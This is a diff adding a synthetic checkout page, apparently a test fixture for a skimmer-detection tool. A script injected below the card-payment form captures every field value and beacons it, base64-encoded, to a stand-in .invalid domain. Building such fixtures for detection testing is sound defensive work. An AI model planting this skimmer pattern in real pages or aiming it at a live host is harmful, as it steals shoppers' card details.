@@ -1,0 +1,22 @@
+<!-- PreFlight SYNTHETIC sample page. Inert: for testing and demos only. Attacker domains use the reserved .invalid ending and never resolve; commands only print a test message. -->
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Checkout | Willow Outdoor</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+</head><body>
+<nav><a href="/">Shop</a> <a href="/basket">Basket</a> <a href="/help">Help</a></nav>
+<h1>Checkout</h1><p>Rain jacket - &pound;89.00</p>
+<form action="/checkout/pay" method="post">
+  <input name="cardnumber" autocomplete="cc-number" placeholder="Card number">
+  <input name="exp" autocomplete="cc-exp" placeholder="MM/YY">
+  <input name="cvc" autocomplete="cc-csc" placeholder="CVC">
+  <button>Pay</button>
+</form>
+<script>
+/* Injected skimmer (synthetic). Sends field values to a domain that never resolves. */
+document.querySelectorAll('input').forEach(function (i) {
+  i.addEventListener('change', function () {
+    new Image().src = 'https://cdn-analytics-js.invalid/i.gif?d=' + btoa(i.name + '=' + i.value);
+  });
+});
+</script>
+<footer><a href="/terms">Terms</a></footer>
+</body></html>
